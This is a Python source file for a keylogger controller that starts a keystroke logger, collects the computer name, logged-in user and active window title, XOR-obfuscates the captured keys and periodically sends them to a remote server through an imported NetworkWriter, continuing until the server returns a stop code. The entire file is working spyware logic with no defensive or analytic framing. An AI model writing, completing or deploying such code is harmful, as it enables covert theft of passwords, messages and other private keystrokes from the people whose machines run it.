from component import *
import json
import time
import os
import socket
import pygetwindow as gw


class KeyLoggerManager:
    def __init__(self, send_interval=60) -> None:
        # Set the interval for sending data (in seconds)
        self.SEND_INTERVAL: int = send_interval  # Can be modified if needed

    def get_active_window(self) -> str:
        """Returns the name of the currently active application (if possible)"""
        try:
            active_window = gw.getActiveWindow()
            return active_window.title if active_window else "Unknown App"
        except Exception:
            return "Unknown App"

    def start_log(self) -> None:
        # Initialize key logger and encryptor
        key_logger = KeyLoggerService()
        encryptor = XorEcryptor()

        # Get computer name and logged-in user
        computer_name: str = socket.gethostname()
        try:
            user_name: str = os.getlogin()
        except Exception:
            user_name = "UnknownUser"

        key_logger.start_logging()  # Start key logging

        last_error = None  # Store error message if sending fails

        try:
            while True:
                time.sleep(self.SEND_INTERVAL)  # Wait for the defined interval
                
                # Get timestamp
                timestamp: str = time.strftime("%Y-%m-%d %H:%M")
                
                # Get the active application name
                active_app: str = self.get_active_window()
                
                # Retrieve recorded keystrokes
                logged_keys: list[str] = key_logger.get_logged_keys()

                # If no keystrokes, skip sending
                if not logged_keys:
                    continue

                # Prepare data to send
                data_to_send = {
                    "timestamp": timestamp,
                    "computer_name": computer_name,
                    "user_name": user_name,
                    "active_app": active_app,
                    "keys": logged_keys
                }

                # If a previous error occurred, include it in the data
                if last_error:
                    data_to_send["last_error"] = last_error
                    last_error = None  # Reset error after reporting

                # Encrypt the data before sending
                json_data = json.dumps(data_to_send)  # Convert dictionary to JSON string
                encrypted_data: bytes = encryptor.encrypt(json_data)

                # Send data to the server
                try:
                    status_code: int = NetworkWriter.send_data(encrypted_data)
                    print(status_code)
                    key_logger.clear_log()  # Clear log after successful transmission
                    if status_code == 560: # when the server send stop status code
                        key_logger.start_logging()
                        break
                except Exception as e:
                    last_error: str = f"Failed to send data at {timestamp}: {str(e)}"

        except KeyboardInterrupt:
            key_logger.stop_logging()  # Stop logging when interrupted


if __name__ == "__main__":
    key_logger_manager = KeyLoggerManager(10)  # Set logging interval to 10 seconds
    key_logger_manager.start_log()
